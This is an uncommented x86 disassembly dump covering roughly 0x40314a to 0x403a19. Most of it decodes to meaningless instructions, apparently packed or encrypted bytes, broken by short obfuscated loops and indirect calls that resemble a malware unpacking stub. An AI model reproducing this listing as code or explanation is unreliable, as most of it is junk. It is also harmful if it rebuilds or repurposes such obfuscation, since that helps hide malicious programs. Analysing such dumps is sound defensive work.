  40314a:	lock mov dl,0x0
  40314d:	(bad)  
  40314e:	in     eax,dx
  40314f:	and    eax,0x299d34eb
  403154:	call   0x5568:0xd3f324bd
  40315b:	mov    ebx,0x7da70031
  403160:	or     al,0xf1
  403162:	jnp    0x403112
  403164:	xor    al,0xab
  403166:	push   edx
  403167:	mov    ch,0xd0
  403169:	cmp    eax,0x642dcadc
  40316e:	pushf  
  40316f:	adc    al,dl
  403171:	mov    esp,0xae46ed59
  403176:	mov    BYTE PTR [edx+0x43],dl
  403179:	gs cdq 
  40317b:	xor    edx,ecx
  40317d:	and    BYTE PTR [ebx],dh
  40317f:	adc    BYTE PTR ds:[ecx+edi*8],ah
  403183:	add    ecx,ebp
  403185:	pop    ds
  403186:	xchg   edx,eax
  403187:	jae    0x4031f9
  403189:	and    eax,0x7fd14aab
  40318e:	xchg   DWORD PTR [edi-0x1],ecx
  403191:	ja     0x40320d
  403193:	xor    bh,BYTE PTR [ecx+0x28]
  403196:	fst    st(3)
  403198:	pop    ss
  403199:	adc    DWORD PTR cs:[ecx],ebx
  40319c:	add    DWORD PTR [ecx+ecx*2-0x2489faf0],ebx
  4031a3:	jb     0x403125
  4031a5:	mov    WORD PTR [ebp+esi*4+0x3ce234c],ss
  4031ac:	repnz pop ss
  4031ae:	(bad)  
  4031af:	dec    edi
  4031b0:	dec    edx
  4031b1:	and    edi,eax
  4031b3:	aam    0xac
  4031b5:	and    dh,BYTE PTR [edi-0x53d8c8ad]
  4031bb:	fwait
  4031bc:	and    eax,DWORD PTR [eax+0x2a]
  4031bf:	sub    eax,DWORD PTR [edi-0x4e]
  4031c2:	mov    dl,0xa1
  4031c4:	push   ss
  4031c5:	and    ah,BYTE PTR [edi-0x43771a07]
  4031cb:	call   DWORD PTR [esi+ebx*1]
  4031ce:	sbb    bh,BYTE PTR [ecx-0x20b60e04]
  4031d4:	in     al,dx
  4031d5:	je     0x40324e
  4031d7:	call   0xb6ad4a14
  4031dc:	ret    
  4031dd:	mov    edx,DWORD PTR [edi]
  4031df:	loop   0x403223
  4031e1:	pusha  
  4031e2:	rcl    BYTE PTR [ecx-0x50],cl
  4031e5:	xchg   ebp,eax
  4031e6:	adc    al,0xe3
  4031e8:	sbb    DWORD PTR [esp+esi*2-0x2],esp
  4031ec:	xchg   esi,eax
  4031ed:	mov    al,ds:0x87445ff
  4031f2:	cmp    eax,0x306931e7
  4031f7:	pop    ecx
  4031f8:	outs   dx,DWORD PTR ds:[esi]
  4031f9:	sahf   
  4031fa:	cdq    
  4031fb:	sahf   
  4031fc:	je     0x4031a0
  4031fe:	int    0x90
  403200:	in     al,dx
  403201:	outs   dx,BYTE PTR ds:[esi]
  403202:	adc    BYTE PTR ds:0x3e50e5a4,cl
  403208:	jmp    0xa04151ef
  40320d:	cmp    DWORD PTR [edi-0x7faba7f5],esp
  403213:	and    edx,DWORD PTR [esi]
  403215:	pop    ecx
  403216:	nop
  403217:	dec    eax
  403218:	inc    BYTE PTR [ecx-0x2c]
  40321b:	(bad)  
  40321c:	mov    ebx,0x9e6646ed
  403221:	jp     0x403216
  403223:	sbb    eax,0x28a8e05b
  403228:	aam    0x4f
  40322a:	xor    al,0x57
  40322c:	xor    DWORD PTR [edi+esi*4-0x46],esp
  403230:	mov    bh,BYTE PTR [esi]
  403232:	call   0x6da1:0xb8a6eb9b
  403239:	mov    al,ds:0x808bb87d
  40323e:	imul   BYTE PTR [edi]
  403240:	mov    esi,ss
  403242:	sub    DWORD PTR [edi+ebx*1+0x6e753c19],0x43
  40324a:	adc    al,0x7a
  40324c:	sti    
  40324d:	add    al,0x2f
  40324f:	neg    eax
  403251:	push   eax
  403252:	pop    edx
  403253:	mov    ecx,0xbedad747
  403258:	hlt    
  403259:	mov    eax,ds:0xbdd417fe
  40325e:	ret    
  40325f:	or     al,0x33
  403261:	aam    0x7f
  403263:	adc    DWORD PTR [edx],edx
  403265:	and    al,0x18
  403267:	adc    eax,0x3b5dbe06
  40326c:	sbb    BYTE PTR [ebx],bl
  40326e:	jl     0x4032d5
  403270:	call   0xb8a3:0xcafe58cf
  403277:	cmp    BYTE PTR [edx+0x33660000],cl
  40327d:	inc    ecx
  40327e:	and    BYTE PTR [ecx+0x3afe],bh
  403284:	and    DWORD PTR ds:0x4346fb,0x4346c3
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43470f
  403297:	xor    ecx,DWORD PTR ds:0x43466b
  40329d:	mov    DWORD PTR ds:0x43470f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x4346ff
  4032ac:	xor    DWORD PTR ds:0x434683,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43470f
  4032bb:	sbb    ecx,DWORD PTR ds:0x43473f
  4032c1:	mov    DWORD PTR ds:0x43470f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43470f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43478b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     ch,al
  4032f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032f5:	das    
  4032f6:	or     edx,DWORD PTR [eax]
  4032f8:	jle    0x403378
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x403349
  4032ff:	mov    ds:0x749432f4,al
  403304:	or     DWORD PTR [edi+0x2c],esi
  403307:	int3   
  403308:	aam    0x8c
  40330a:	shr    dh,cl
  40330c:	test   ah,dl
  40330e:	stos   DWORD PTR es:[edi],eax
  40330f:	(bad)  
  403310:	lds    ebp,FWORD PTR [esi]
  403312:	dec    esp
  403313:	add    bh,BYTE PTR [edi+0x20]
  403316:	dec    esi
  403317:	ins    BYTE PTR es:[edi],dx
  403318:	out    dx,eax
  403319:	xor    al,0x84
  40331b:	xchg   esi,eax
  40331c:	test   DWORD PTR [ebx-0x29],0xe92dd396
  403323:	mov    al,ds:0x572573f8
  403328:	sahf   
  403329:	arpl   WORD PTR [esi+0x7f],dx
  40332c:	ds aas 
  40332e:	pop    ebx
  40332f:	frstor [edi+0x63f1221f]
  403335:	ins    DWORD PTR es:[edi],dx
  403336:	dec    eax
  403337:	scas   eax,DWORD PTR es:[edi]
  403338:	addr16 cmp eax,0x87e90dcb
  40333e:	ins    BYTE PTR es:[edi],dx
  40333f:	(bad)
  403343:	(bad)  
  403344:	lds    edx,FWORD PTR [esi]
  403346:	lock pop ss
  403348:	out    0x95,eax
  40334a:	cmp    al,0x98
  40334c:	rcr    esi,1
  40334e:	fs jle 0x40338e
  403351:	ja     0x40330e
  403353:	cmp    al,dl
  403355:	add    BYTE PTR [ecx],bh
  403357:	stos   BYTE PTR es:[edi],al
  403358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403359:	add    al,0x8e
  40335b:	mov    eax,ds:0x6890eec1
  403360:	in     al,0x95
  403362:	fistp  WORD PTR [edx+0x5571b21f]
  403368:	das    
  403369:	mov    edx,DWORD PTR [esi+0xe4be833]
  40336f:	scas   eax,DWORD PTR es:[edi]
  403370:	push   ebp
  403371:	popa   
  403372:	inc    edi
  403373:	sbb    BYTE PTR [ecx+0x6744795d],ch
  403379:	ret    0x4c4d
  40337c:	jp     0x4033b2
  40337e:	mov    edi,0x233aabd2
  403383:	add    edi,DWORD PTR [ecx-0x6b]
  403386:	inc    esi
  403387:	sub    ebx,DWORD PTR [esp+ebx*4]
  40338a:	pop    eax
  40338b:	mov    bh,0x51
  40338d:	imul   eax,DWORD PTR es:[edx-0x44],0xffffff85
  403392:	(bad)  
  403393:	sbb    ebp,esp
  403395:	ficomp WORD PTR [ebx-0x40]
  403398:	sbb    BYTE PTR [edx],bl
  40339a:	rcl    DWORD PTR [edx],cl
  40339c:	wbinvd 
  40339e:	mov    bl,0x94
  4033a0:	adc    DWORD PTR [edi],0xffffffb4
  4033a3:	lods   eax,DWORD PTR ds:[esi]
  4033a4:	cwde   
  4033a5:	(bad)  
  4033a6:	mov    bl,0x1
  4033a8:	std    
  4033a9:	pushf  
  4033aa:	rcr    BYTE PTR [eax-0x3e35e0d9],cl
  4033b0:	jmp    0xd3f45d2e
  4033b5:	jge    0x4033fa
  4033b7:	in     al,0x42
  4033b9:	imul   eax,ebx,0xffffffe1
  4033bc:	and    DWORD PTR ds:0xa906f422,ecx
  4033c2:	ja     0x403391
  4033c4:	jnp    0x4033f7
  4033c6:	add    bl,BYTE PTR [bp-0x5256]
  4033cb:	rcr    BYTE PTR [ebx],1
  4033cd:	lods   eax,DWORD PTR ds:[esi]
  4033ce:	dec    ebx
  4033cf:	jno    0x403432
  4033d1:	push   0x30
  4033d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033d4:	xchg   esp,eax
  4033d5:	hlt    
  4033d6:	pop    eax
  4033d7:	mov    bh,0xf6
  4033d9:	int    0x19
  4033db:	fwait
  4033dc:	push   ds
  4033dd:	es sbb eax,0x987b6e7f
  4033e3:	mov    cl,0xac
  4033e5:	adc    DWORD PTR [edi],ecx
  4033e7:	sub    DWORD PTR [ecx],esi
  4033e9:	mov    cl,0xe2
  4033eb:	push   0x8c879ec1
  4033f0:	setne  BYTE PTR [edi-0x43]
  4033f4:	mov    al,0x97
  4033f6:	inc    esi
  4033f7:	lods   al,BYTE PTR ds:[esi]
  4033f8:	xchg   BYTE PTR [edi],dl
  4033fa:	mov    edx,ebx
  4033fc:	xor    DWORD PTR [ebx-0x10683edd],ebx
  403402:	xor    ebp,DWORD PTR [edx-0x49]
  403405:	jmp    0xbc86455d
  40340a:	mov    ebp,0x3b1fb689
  40340f:	pop    edx
  403410:	sub    ch,BYTE PTR [edi-0x6157af9a]
  403416:	pop    esi
  403417:	and    ebx,DWORD PTR [ecx+edx*4-0x43]
  40341b:	mov    ebp,esi
  40341d:	(bad)  
  40341e:	call   0x224b:0xfe77aa6f
  403425:	cmp    eax,0xcf3872df
  40342a:	lods   eax,DWORD PTR ds:[esi]
  40342b:	pop    edi
  40342c:	sbb    BYTE PTR [esi+0x29dfea8c],0x4d
  403433:	cmp    dl,dl
  403435:	retf   0xd4c6
  403438:	and    al,0xc2
  40343a:	mov    edx,DWORD PTR [esi]
  40343c:	mov    edx,0xcc262db9
  403441:	mov    ds:0x37303e68,eax
  403446:	jge    0x403438
  403448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403449:	aam    0x57
  40344b:	(bad)  
  40344c:	or     edx,DWORD PTR [ebx+0x2970741]
  403452:	xor    BYTE PTR [esi],dl
  403454:	stos   BYTE PTR es:[edi],al
  403455:	loop   0x4034c1
  403457:	xlat   BYTE PTR ds:[ebx]
  403458:	imul   ecx,DWORD PTR [ebp+0x527eff5b],0x77
  40345f:	scas   eax,DWORD PTR es:[edi]
  403460:	pusha  
  403461:	je     0x4034b4
  403463:	adc    cl,BYTE PTR [ecx-0x2794605]
  403469:	fs das 
  40346b:	int3   
  40346c:	mov    al,ds:0xf3869f0a
  403471:	and    ax,0x6c8d
  403475:	or     eax,0xcafd0980
  40347a:	cs pop eax
  40347c:	cmp    esp,edx
  40347e:	sub    BYTE PTR [edx],0x5b
  403481:	xchg   ebx,eax
  403482:	mov    esi,0x12edfe90
  403487:	stc    
  403488:	jg     0x4034e8
  40348a:	lahf   
  40348b:	rcl    bl,1
  40348d:	mov    ebx,0x663320ea
  403492:	adc    DWORD PTR [ebp+0x4321ee0c],esp
  403498:	xchg   ebp,eax
  403499:	pop    ecx
  40349a:	add    ch,BYTE PTR [ebp-0x61f397f5]
  4034a0:	xor    bl,al
  4034a2:	mov    cl,0xbd
  4034a4:	addr16 test al,0xb3
  4034a7:	icebp  
  4034a8:	inc    edi
  4034a9:	int    0x25
  4034ab:	je     0x403491
  4034ad:	stos   BYTE PTR es:[edi],al
  4034ae:	ror    dh,1
  4034b0:	ins    BYTE PTR es:[edi],dx
  4034b1:	xor    BYTE PTR ss:[eax-0x48],0x69
  4034b6:	adc    eax,0x3555215e
  4034bb:	or     al,0xa6
  4034bd:	dec    eax
  4034be:	mov    bl,al
  4034c0:	cmp    DWORD PTR ds:[edx-0x21],eax
  4034c4:	mov    esi,0xd1421f23
  4034c9:	mov    esi,0x681308f1
  4034ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034cf:	loopne 0x4034f7
  4034d1:	(bad)  
  4034d2:	mov    eax,0xa469f67d
  4034d7:	out    dx,al
  4034d8:	xchg   esp,eax
  4034d9:	mov    ah,0xf0
  4034db:	sti    
  4034dc:	mov    esp,0x5d8c264b
  4034e1:	js     0x4034c9
  4034e3:	test   al,0x8e
  4034e5:	loopne 0x4034b3
  4034e7:	(bad)  
  4034e8:	sub    eax,0xd266f18c
  4034ed:	jecxz  0x403521
  4034ef:	(bad)  
  4034f0:	fisub  WORD PTR [esi-0x1e]
  4034f3:	in     eax,dx
  4034f4:	out    dx,eax
  4034f5:	repnz pushf 
  4034f7:	daa    
  4034f8:	inc    eax
  4034f9:	jnp    0x4034f8
  4034fb:	pop    ebp
  4034fc:	sar    BYTE PTR [ecx+0x46f27e0e],1
  403502:	push   cs
  403503:	jns    0x4034a5
  403505:	ret    0xbfb6
  403508:	lea    ebp,[ecx]
  40350a:	jns    0x40355d
  40350c:	retf   0x9088
  40350f:	mov    ecx,0xa0aa607
  403514:	inc    edx
  403515:	inc    esp
  403516:	arpl   WORD PTR [ecx+0x2b],bp
  403519:	(bad)  
  40351a:	gs test al,0x65
  40351d:	inc    esi
  40351e:	mov    eax,ds:0x4a97eb06
  403523:	mov    ebp,0xb2a14f63
  403528:	addr16 xchg esi,eax
  40352a:	adc    dh,BYTE PTR [edi]
  40352c:	sbb    esi,DWORD PTR [esp+esi*8]
  40352f:	fs sub esp,edi
  403532:	sub    bh,BYTE PTR [edi+0xe336cb7]
  403538:	sub    eax,0x3e81f9b9
  40353d:	sub    bl,al
  40353f:	fild   DWORD PTR [eax]
  403541:	sbb    al,0x63
  403543:	mov    eax,ds:0xf21b0047
  403548:	jge    0x403590
  40354a:	ins    BYTE PTR es:[edi],dx
  40354b:	idiv   BYTE PTR [esi-0x26]
  40354e:	mov    bl,0x3
  403550:	xchg   ebp,eax
  403551:	mov    fs,WORD PTR [edx]
  403553:	xor    edx,DWORD PTR [esi-0x241071e5]
  403559:	not    ebx
  40355b:	aam    0x9e
  40355d:	loop   0x4035d5
  40355f:	fdiv   QWORD PTR es:[eax-0x12]
  403563:	sub    ah,ah
  403565:	(bad)  
  403566:	jmp    0xfd38:0x550846c4
  40356d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40356e:	data16 mov bh,0xe7
  403571:	jne    0x403589
  403573:	and    edi,DWORD PTR [esi]
  403575:	stos   BYTE PTR es:[edi],al
  403576:	jne    0x403579
  403578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403579:	sbb    al,0x82
  40357b:	pop    ebp
  40357c:	push   ecx
  40357d:	test   eax,0x798307b6
  403582:	jl     0x40350f
  403584:	imul   eax,DWORD PTR [edx],0x1065ce33
  40358a:	xor    edx,DWORD PTR [ecx-0x383cadf1]
  403590:	adc    ecx,edx
  403592:	imul   ebx,eax,0x5c302de
  403598:	adc    DWORD PTR [esi],ebx
  40359a:	and    ecx,esi
  40359c:	xor    edx,edx
  40359e:	xor    dh,BYTE PTR [esi+0x30cc6789]
  4035a4:	pop    ebp
  4035a5:	xlat   BYTE PTR ds:[ebx]
  4035a6:	cmp    BYTE PTR [eax+0x447ca072],ah
  4035ac:	jl     0x40359a
  4035ae:	xchg   edi,eax
  4035af:	aad    0x94
  4035b1:	push   ds
  4035b2:	adc    DWORD PTR [esi+0x6d50aae7],esi
  4035b8:	cmp    al,0x33
  4035ba:	dec    ecx
  4035bb:	test   edx,ecx
  4035bd:	fidiv  WORD PTR ds:0x583b7634
  4035c3:	cld    
  4035c4:	pop    eax
  4035c5:	adc    ebp,0x5cd0ddef
  4035cb:	push   0xbf691e78
  4035d0:	jl     0x403630
  4035d2:	aad    0xe1
  4035d4:	dec    ecx
  4035d5:	jne    0x403571
  4035d7:	mov    edi,0xc1647062
  4035dc:	push   esp
  4035dd:	mov    ds:0xeaecc007,eax
  4035e2:	test   BYTE PTR [eax-0x12fff266],cl
  4035e8:	popf   
  4035e9:	mov    WORD PTR [esi],es
  4035eb:	xchg   ecx,eax
  4035ec:	sub    al,0x94
  4035ee:	cmp    BYTE PTR [esi+0xea25763],dh
  4035f4:	lock sub al,0xd8
  4035f7:	test   BYTE PTR [esp+ebx*8-0x15],ch
  4035fb:	mov    esi,0xd680705b
  403600:	int    0x90
  403602:	pop    ecx
  403603:	inc    esp
  403604:	and    dl,cl
  403606:	mov    cs,WORD PTR [ebx+0x703171d5]
  40360c:	pop    es
  40360d:	mov    cs,WORD PTR [ebp-0x57]
  403610:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403611:	scas   eax,DWORD PTR es:[edi]
  403612:	jg     0x4035e6
  403614:	out    dx,al
  403615:	cli    
  403616:	jno    0x403645
  403618:	(bad)  
  403619:	sub    DWORD PTR [edx-0x102b3bec],esi
  40361f:	(bad)  
  403620:	push   ebx
  403621:	leave  
  403622:	popa   
  403623:	inc    eax
  403624:	iret   
  403625:	cmp    eax,0x939268ed
  40362a:	jae    0x4035b4
  40362c:	pop    ebx
  40362d:	or     ebp,esi
  40362f:	push   ebp
  403630:	pop    ecx
  403631:	jmp    0x94ed95d1
  403636:	push   ebp
  403637:	outs   dx,BYTE PTR ds:[esi]
  403638:	(bad)  
  403639:	loope  0x4035c5
  40363b:	or     DWORD PTR [eax-0x34],0x49283986
  403642:	or     eax,DWORD PTR [ecx+0x48]
  403645:	cli    
  403646:	add    al,0xd2
  403648:	outs   dx,DWORD PTR ds:[esi]
  403649:	mov    eax,ds:0xb2161f2
  40364e:	imul   esp,DWORD PTR [ecx+0x51],0x229080a4
  403655:	out    0xf9,al
  403657:	adc    ecx,DWORD PTR [ebx]
  403659:	or     eax,0x1d54d99e
  40365e:	test   DWORD PTR [ebp-0x3afc3575],ecx
  403664:	pop    eax
  403665:	bnd jns 0x403687
  403668:	cdq    
  403669:	jne    0x403607
  40366b:	fcmovnu st,st(7)
  40366d:	xor    BYTE PTR [edi],bh
  40366f:	inc    ecx
  403670:	mov    edx,0x28a6acbe
  403675:	xchg   DWORD PTR [edi],esp
  403677:	xor    al,0x9a
  403679:	pusha  
  40367a:	jl     0x40361a
  40367c:	cmp    ah,dl
  40367e:	mov    WORD PTR [ebp-0x1c0a8504],fs
  403684:	mov    dl,0xcb
  403686:	test   al,0x59
  403688:	xor    al,0xb6
  40368a:	mov    cl,0xc1
  40368c:	mov    eax,0xbb5f9b30
  403691:	es mov dl,ch
  403694:	xchg   edi,eax
  403695:	ret    
  403696:	xchg   ecx,eax
  403697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403698:	push   cs
  403699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40369a:	ss popa 
  40369c:	sub    BYTE PTR [eax+0x3b],al
  40369f:	bound  edx,QWORD PTR [esi+ebp*4+0x35]
  4036a3:	adc    bl,ah
  4036a5:	in     al,0x59
  4036a7:	(bad)
  4036aa:	fcos   
  4036ac:	push   0x7d
  4036ae:	xchg   ebx,eax
  4036af:	mov    edi,0xc0ef4375
  4036b4:	mov    ah,BYTE PTR [edx+0x8]
  4036b7:	xor    eax,0x273d3b5
  4036bc:	cdq    
  4036bd:	dec    esp
  4036be:	and    BYTE PTR [ebp-0x37fef082],bl
  4036c4:	pop    ebp
  4036c5:	retf   
  4036c6:	cmp    DWORD PTR [edx],ecx
  4036c8:	out    0x2a,eax
  4036ca:	push   ebp
  4036cb:	retf   0x52b9
  4036ce:	aaa    
  4036cf:	daa    
  4036d0:	xor    BYTE PTR [ebx+esi*4+0x1a],bh
  4036d4:	mov    edi,0xff458a73
  4036d9:	mov    ecx,DWORD PTR ds:0x43466b
  4036df:	sbb    ecx,DWORD PTR ds:0x434787
  4036e5:	mov    DWORD PTR ds:0x43466b,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434793,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x43467b,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x434677,0x434787
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x4346f7,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434707,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434707
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434707,ecx
  40373d:	cmp    DWORD PTR ds:0x434707,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434707,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x43474b,0x14
  403779:	cmp    DWORD PTR ds:0x43474b,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x43474b,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x43474b,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x43474b
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x43474b,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x43474b
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x43474b,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x434667,0x1c
  4037dc:	cmp    DWORD PTR ds:0x434667,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x434667,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x4348c9
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x434667,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x434667
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x434667,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x434667
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x434667,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434707,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43478b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x4346cf,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x4346c3
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x4346cb,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038be:	int3   
  4038bf:	mov    BYTE PTR [ebx+eiz*2+0x567e7e13],bl
  4038c6:	jns    0x403946
  4038c8:	jle    0x403866
  4038ca:	cmp    eax,0x1a1d9ed9
  4038cf:	lock es push edx
  4038d2:	sbb    BYTE PTR [ecx+0x4b8735e4],dl
  4038d8:	or     DWORD PTR [ebx+eiz*1+0x54],eax
  4038dc:	sub    BYTE PTR [ebx-0x46],cl
  4038df:	mov    al,0x1b
  4038e1:	sub    esp,DWORD PTR [ebx-0x69]
  4038e4:	fucomip st,st(2)
  4038e6:	push   esp
  4038e7:	pop    ebp
  4038e8:	rol    BYTE PTR [eax-0x53],cl
  4038eb:	cmp    DWORD PTR [edx-0x22],ebp
  4038ee:	xchg   esi,eax
  4038ef:	mov    BYTE PTR ds:0x6a22b5e2,dl
  4038f5:	fmul   DWORD PTR [ebx]
  4038f7:	or     BYTE PTR [esp+esi*8+0x725a27e4],bh
  4038fe:	mov    ds:0xe99317c0,al
  403903:	mov    bl,0x79
  403905:	sbb    eax,0xaa91b94
  40390a:	or     DWORD PTR [ebx+0x4a],ebx
  40390d:	add    eax,DWORD PTR [ebx+0x1f9f2efa]
  403913:	sbb    BYTE PTR [edx],ah
  403915:	cmp    dh,ah
  403917:	mov    esp,DWORD PTR [ebx+ebx*2]
  40391a:	inc    ebp
  40391b:	xor    DWORD PTR [eax+0x79],edx
  40391e:	addr16 dec edx
  403920:	and    al,0xf5
  403922:	pop    edi
  403923:	call   0x4968a71f
  403928:	mov    cl,0xb7
  40392a:	push   edi
  40392b:	mov    ch,0x61
  40392d:	into   
  40392e:	repnz out 0x74,al
  403931:	out    dx,eax
  403932:	fiadd  WORD PTR [ebx+0x77b5b04d]
  403938:	lods   eax,DWORD PTR ds:[esi]
  403939:	rcl    DWORD PTR [ecx+0x3375c9f],1
  40393f:	sbb    edx,edi
  403941:	ss fmul st,st(3)
  403944:	add    esp,DWORD PTR [esi+0x7127f4c]
  40394a:	xor    al,0xb2
  40394c:	(bad)  
  40394d:	fimul  WORD PTR [eax+ebp*1+0x2a15408f]
  403954:	inc    edi
  403955:	es lahf 
  403957:	ins    DWORD PTR es:[edi],dx
  403958:	mul    al
  40395a:	mov    ebx,0x6b23f52e
  40395f:	mov    esi,0x7fc2721
  403964:	cli    
  403965:	cmp    bl,bl
  403967:	pop    esp
  403968:	xchg   edx,eax
  403969:	pop    ss
  40396a:	(bad)  
  40396b:	mov    ebx,0x65cda030
  403970:	sbb    DWORD PTR [ecx],0xffffff8d
  403973:	sar    ch,cl
  403975:	jo     0x403923
  403977:	int3   
  403978:	fcom   QWORD PTR [ebp+ecx*4-0x29]
  40397c:	inc    edx
  40397d:	cmp    BYTE PTR ds:0x922092f9,ch
  403983:	outs   dx,BYTE PTR ds:[esi]
  403984:	stos   DWORD PTR es:[edi],eax
  403985:	shr    bh,0xef
  403988:	call   0x16ce:0xcfe60e9
  40398f:	mov    DWORD PTR [edx+0x2269d50b],esi
  403995:	in     eax,dx
  403996:	pusha  
  403997:	nop
  403998:	xchg   DWORD PTR [ebp-0xf0f72a5],esp
  40399e:	stos   DWORD PTR es:[edi],eax
  40399f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039a0:	fidiv  DWORD PTR [ecx-0x36]
  4039a3:	cmp    cl,BYTE PTR [edx+eax*4]
  4039a6:	cmp    DWORD PTR [edi+0x3472abaa],edx
  4039ac:	cmp    al,0x11
  4039ae:	pushf  
  4039af:	clc    
  4039b0:	sar    DWORD PTR [edi+0x64],0xa4
  4039b4:	add    DWORD PTR [ebp*1-0x13c7f3b],0xeaef417e
  4039bf:	loope  0x4039ba
  4039c1:	jle    0x4039fd
  4039c3:	pop    es
  4039c4:	cmp    bh,dl
  4039c6:	mov    eax,ds:0xbfcf0a58
  4039cb:	jmp    0x1fa0eb50
  4039d0:	mov    dh,0xea
  4039d2:	aaa    
  4039d3:	xchg   edi,eax
  4039d4:	dec    eax
  4039d5:	aas    
  4039d6:	lds    ebp,FWORD PTR ds:0x928d2b90
  4039dc:	mov    esp,ecx
  4039de:	ret    
  4039df:	sub    BYTE PTR [ecx+0x76],bh
  4039e2:	jne    0x403a0e
  4039e4:	dec    ebp
  4039e5:	fcomp  QWORD PTR [edi]
  4039e7:	shl    DWORD PTR [ebp+0x75],0xbd
  4039eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ec:	sbb    edi,eax
  4039ee:	or     al,0xc7
  4039f0:	cmp    al,0xbc
  4039f2:	jnp    0x4039c7
  4039f4:	push   esi
  4039f5:	cmp    ch,BYTE PTR [ebp-0x15cda6ec]
  4039fb:	loop   0x403a2c
  4039fd:	fisttp QWORD PTR [ecx+0x6e838c4c]
  403a03:	mov    edx,0x69635f27
  403a08:	and    eax,0x879ec6c4
  403a0d:	ret    0xee92
  403a10:	fcom   st(5)
  403a12:	dec    edx
  403a13:	dec    ebp
  403a14:	push   0xffffffa2
  403a16:	or     cl,BYTE PTR [ecx+0xf]
  403a19:	inc    ebx
